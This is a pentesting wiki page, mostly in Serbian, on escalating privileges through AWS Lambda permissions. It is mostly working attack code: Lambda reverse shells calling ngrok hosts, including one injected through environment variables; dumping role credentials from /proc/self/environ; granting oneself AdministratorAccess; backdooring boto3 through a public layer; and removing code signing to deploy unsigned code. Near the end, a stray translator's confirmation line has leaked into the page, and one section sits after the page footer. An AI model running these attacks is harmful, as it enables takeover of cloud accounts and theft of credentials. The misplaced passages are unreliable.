# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

Više informacija o lambda u:

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Korisnici sa **`iam:PassRole`, `lambda:CreateFunction` i `lambda:InvokeFunction`** dozvolama mogu eskalirati svoje privilegije.\
Mogu **kreirati novu Lambda funkciju i dodeliti joj postojeću IAM ulogu**, čime funkciji dodeljuju dozvole povezane sa tom ulogom. Korisnik potom može **napisati i otpremiti kod u ovu Lambda funkciju (na primer sa rev shell-om)**.\
Kada je funkcija postavljena, korisnik može **pokrenuti njeno izvršavanje** i izvršiti željene akcije pozivanjem Lambda funkcije preko AWS API-ja. Ovaj pristup omogućava korisniku da indirektno izvršava zadatke preko Lambda funkcije, radeći sa nivoom pristupa koji je dodeljen IAM ulozi povezanoj sa njom.\\

A attacker could abuse this to get a **rev shell and steal the token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Takođe možete **zloupotrebiti dozvole lambda uloge** iz same lambda funkcije.\
Ako bi lambda uloga imala dovoljno dozvola, mogli biste je iskoristiti da sebi dodelite administratorska prava:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Takođe je moguće leak lambda's role credentials bez potrebe za eksternom konekcijom. Ovo bi bilo korisno za **Network isolated Lambdas** koje se koriste za interne zadatke. Ako postoje nepoznati security groups koji filtriraju vaše reverse shells, ovaj deo koda će vam omogućiti da direktno leak lambda's role credentials kao izlaz lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potential Impact:** Direktan privesc na proizvoljnu lambda servisnu ulogu koja je navedena.

> [!CAUTION]
> Imajte na umu da, iako može izgledati interesantno, **`lambda:InvokeAsync`** sama po sebi **ne dozvoljava** izvršavanje **`aws lambda invoke-async`**, takođe vam treba `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Kao u prethodnom scenariju, možete sebi **dodeliti dozvolu `lambda:InvokeFunction`** ako imate dozvolu **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencijalni uticaj:** Direktan privesc na proizvoljnu lambda servisnu ulogu koja je navedena.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Korisnici sa **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`** dozvolama (i potencijalno `dynamodb:PutItem` i `dynamodb:CreateTable`) mogu indirektno **escalate privileges** čak i bez `lambda:InvokeFunction`.\
Mogu da kreiraju **Lambda function sa zlonamernim kodom i dodele mu postojeći IAM role**.

Umesto da direktno pozovu Lambda, korisnik postavi ili iskoristi postojeću DynamoDB tabelu, povezujući je sa Lambda kroz event source mapping. Ova konfiguracija osigurava da se **Lambda function automatski aktivira prilikom unosa nove stavke** u tabelu, bilo akcijom korisnika ili nekog drugog procesa, čime se Lambda function indirektno poziva i izvršava kod sa dozvolama prosleđene IAM role.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Ako je DynamoDB već aktivan u AWS okruženju, korisnik samo **treba da uspostavi event source mapping** za Lambda funkciju. Međutim, ako DynamoDB nije u upotrebi, korisnik mora **da kreira novu tabelu** sa omogućenim streamingom:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Sada je moguće **povezati Lambda funkciju sa DynamoDB tabelom** pomoću **kreiranja event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Kada je Lambda funkcija povezana sa DynamoDB stream-om, napadač može **indirektno pokrenuti Lambda aktiviranjem DynamoDB stream-a**. Ovo se može postići **ubacivanjem stavke** u DynamoDB tabelu:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencijalni uticaj:** Direktan privesc na navedenu lambda servisnu ulogu.

### `lambda:AddPermission`

Attacker sa ovom dozvolom može **dodeliti sebi (ili drugima) bilo koje dozvole** (ovo generiše resource based policies koje dodeljuju pristup resursu):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Potencijalni uticaj:** Direktni privesc na lambda servisnu ulogu korišćenjem dodeljivanja dozvole za izmenu koda i njegovo pokretanje.

### `lambda:AddLayerVersionPermission`

Napadač sa ovom dozvolom može **dodeliti sebi (ili drugima) dozvolu `lambda:GetLayerVersion`**. Mogao bi pristupiti layer-u i pretražiti ranjivosti ili osetljive informacije
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potencijalni uticaj:** Mogući pristup osetljivim informacijama.

### `lambda:UpdateFunctionCode`

Korisnici koji imaju **`lambda:UpdateFunctionCode`** dozvolu mogu **izmeniti kod postojeće Lambda funkcije koja je povezana sa IAM ulogom.**\
Napadač može **izmeniti kod Lambda funkcije kako bi exfiltrate IAM credentials**.

Iako napadač možda nema direktnu mogućnost da pozove funkciju, ako je Lambda funkcija već postojeća i operativna, verovatno će biti pokrenuta kroz postojeće tokove rada ili događaje, čime se indirektno omogućava izvršavanje izmenjenog koda.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potencijalni uticaj:** Direct privesc na lambda service role koja se koristi.

### `lambda:UpdateFunctionConfiguration`

#### RCE via env variables

Sa ovim dozvolama moguće je dodati varijable okruženja koje će naterati Lambda da izvrši proizvoljan kod. Na primer, u pythonu moguće je zloupotrebiti varijable okruženja `PYTHONWARNING` i `BROWSER` da naterate python proces da izvrši proizvoljne komande:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Za druge skriptne jezike postoje druge env variables koje možete koristiti. Za više informacija pogledajte pododeljke skriptnih jezika u:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) omogućava uključivanje **code** u vaš lamdba function, ali **storing it separately**, tako da function code može ostati mali i **several functions can share code**.

Unutar lambda možete proveriti putanje sa kojih se python code učitava pomoću funkcije kao u sledećem primeru:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Ovo su lokacije:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Na primer, biblioteka boto3 se učitava iz `/var/runtime/boto3` (4. pozicija).

#### Eksploatacija

Moguće je zloupotrebiti dozvolu `lambda:UpdateFunctionConfiguration` da **dodate novi layer** u lambda funkciju. Da biste pokrenuli proizvoljan kod, taj layer mora da sadrži neku **biblioteku koju će lambda importovati.** Ako možete da pročitate kod lambda funkcije, ovo lako možete pronaći; takođe imajte u vidu da je moguće da lambda **već koristi layer** i da biste mogli **preuzeti** taj layer i **dodati svoj kod** u njega.

Na primer, pretpostavimo da lambda koristi biblioteku boto3 — to će kreirati lokalni layer sa poslednjom verzijom biblioteke:
```bash
pip3 install -t ./lambda_layer boto3
```
Možete otvoriti `./lambda_layer/boto3/__init__.py` i **add the backdoor in the global code** (a function to exfiltrate credentials or get a reverse shell for example).

Zatim zip-ujte taj direktorijum `./lambda_layer` i **upload the new lambda layer** na svoj account (ili na account žrtve, ali možda nemate permissions za to).\
Napomena: potrebno je kreirati python folder i staviti biblioteke tamo da override-ujete /opt/python/boto3. Takođe, layer mora biti **compatible with the python version** koju koristi lambda i, ako ga upload-ujete na svoj account, mora biti u **the same region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Sada učinite uploadovani lambda layer **dostupnim za bilo koji nalog**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
I zakačite lambda layer na ciljnu lambda funkciju:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Sledeći korak bi bio da ili sami **pozovemo funkciju** ako možemo ili da sačekamo dok **ne bude pozvana** normalnim putem — što je bezbednija metoda.

A **diskretniji način da se iskoristi ova ranjivost** može se naći u:

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potencijalni uticaj:** Direktan privesc na korišćenu lambda service role.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Možda sa tim permisijama možeš da kreiraš funkciju i izvršiš je pozivom URL-a... ali nisam uspeo da nađem način da to testiram, pa javi ako ti uspeš!

### Lambda MitM

Neke lambda funkcije će **primati osetljive informacije od korisnika u parametrima.** Ako dobiješ RCE u jednoj od njih, možeš exfiltrate informacije koje drugi korisnici šalju toj funkciji, pogledaj u:

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Zaobilaženje Lambda Code Signing

Ako Lambda funkcija zahteva code signing, napadač koji može da ili ukloni Code Signing Config (CSC) ili ga spusti na `WARN` može da deploy-uje unsigned code u funkciju. Ovo zaobilazi zaštitu integriteta bez menjanja IAM role funkcije ili triggera.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Napomene:
- For Path B, you don't need an AWS Signer profile if the CSC policy is set to `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Put A) Uklonite CSC, zatim ažurirajte kod:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Put B) Smanjiti na Warn i ažurirati code (ako brisanje nije dozvoljeno):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Potvrđujem: prevešću relevantan engleski tekst na srpski, zadržavajući tačno istu Markdown/HTML sintaksu i ne prevodeći kod, nazive tehnika, cloud/platforme, linkove, putanje i oznake (npr. {#tabs}, {#ref} itd.). Neću dodavati ništa osim prevedenog sadržaja i sačuvaću ispravan Unicode.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Potencijalni uticaj: Mogućnost ubacivanja i pokretanja proizvoljnog unsigned koda u funkciju koja je trebalo da zahteva signed deployments, što može dovesti do izvršenja koda sa privilegijama role funkcije.

Čišćenje:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

